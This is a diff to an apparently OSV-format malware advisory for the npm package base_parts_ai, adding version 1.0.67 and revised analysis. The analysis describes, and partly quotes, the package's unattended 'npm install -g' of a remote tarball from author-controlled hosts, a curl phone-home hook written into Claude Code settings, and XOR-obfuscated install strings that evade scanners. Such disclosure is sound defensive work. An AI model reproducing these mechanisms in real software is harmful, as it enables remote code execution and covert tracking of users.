@@ -2,9 +2,9 @@
   "schema_version": "1.7.4",
   "id": "MAL-2026-6228",
   "published": "2026-06-19T15:59:03Z",
-  "modified": "2026-11-20T01:13:57.710997335Z",
+  "modified": "2026-11-23T00:34:14.339909018Z",
   "summary": "Malicious code in base_parts_ai (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (07b0e2bcf47f6720470181fe18dda70621d52a4fb65fec395a87e14ec39c5219)\nWhen a user runs the package's `jcc` or `jcx` CLI, lib/ai_utils.js polls https://jai.jaskle.cn/hm/hm_pub/ai_cc_cfg for a `newVer` value and, if it differs from the installed version, executes `npm install -g https://jdwfiles.oss-cn-hangzhou.aliyuncs.com/npm_pkg/base_parts_ai-<newVer>.tgz --force --registry=https://registry.npmmirror.com` with no hash or signature verification. The interactive confirmation prompt has been commented out and the `confirmed` variable is hardcoded to `\"yes\"`, so the global install runs unattended. The tarball is served from a different domain (Aliyun OSS) than the version manifest, and either endpoint — or a compromise of either — can push arbitrary code globally to every CLI user. Separately, the package's `setapi_cc` flow writes a persistent `SessionStart` hook into `~/.claude/settings.json` that runs `curl -s -m 5 https://jai.jaskle.cn/hm/pub/ai_tip?cli=cc-<os>_<arch>` on every Claude Code session start, establishing a phone-home channel keyed to the publisher domain. Note: `package.json` declares `scripts.__postinstall` (double underscore), which npm does not recognize, and `main.js` is a no-op — there is no automatic execution on `npm install` or `require()`. The auto-update channel fires when the user invokes the documented CLI, which is the package's primary advertised use.\n",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (40d21c9d5a6b5da4ede94075ed2f4dde196fab0a47be0b2908993d5a24519417)\nOn every invocation of the package's CLIs (jcc/jcx/ucx/jgrok and related entry points), lib/ai_utils.js fetches a JSON config from https://jai.jaskle.cn/hm/hm_pub/ai_cc_cfg and reads a server-supplied newVer field. When newVer is greater than the installed version, the code builds a tarball URL of the form https://jdwfiles.oss-cn-hangzhou.aliyuncs.com/npm_pkg/base_parts_ai-<newVer>.tgz and passes it to pkgCmd.execGlobalCmd, which runs `npm install -g <tgz-url> --registry=https://registry.npmmirror.com --force`. The user confirmation prompt is commented out and the confirmed flag is hardcoded to \"yes\", so the global install proceeds without interaction. The update source is not the npm registry — it is a mutable author-controlled Aliyun OSS object whose contents can be changed server-side at any time with no registry review, no version pinning, and no hash or signature check. lib/pkg_cmd.js additionally constructs the strings 'npm install', '--registry=', and '--force' at runtime by XOR-decoding (String.fromCharCode(b ^ 0x5A)) hardcoded byte arrays rather than storing the commands as plain literals, concealing the install mechanism from static scanners. Running any CLI from this package therefore causes global installation of whatever bytes the author (or anyone who compromises jai.jaskle.cn or the jdwfiles Aliyun OSS bucket) serves at that URL at that moment, yielding arbitrary code execution on the installer's machine.\n",
   "affected": [
     {
       "package": {
@@ -14,10 +14,16 @@
       "versions": [
         "1.0.52",
         "1.0.50",
-        "1.0.66"
+        "1.0.66",
+        "1.0.67"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -77,6 +83,10 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/base_parts_ai/v/1.0.66"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/base_parts_ai/v/1.0.67"
     }
   ],
   "database_specific": {
@@ -109,6 +119,16 @@
         "source": "amazon-inspector",
         "versions": [
           "1.0.66"
+        ]
+      },
+      {
+        "id": "IN-MAL-2026-023034",
+        "import_time": "2026-11-23T00:32:40.298118674Z",
+        "modified_time": "2026-11-22T23:59:26Z",
+        "sha256": "40d21c9d5a6b5da4ede94075ed2f4dde196fab0a47be0b2908993d5a24519417",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.67"
         ]
       }
     ]
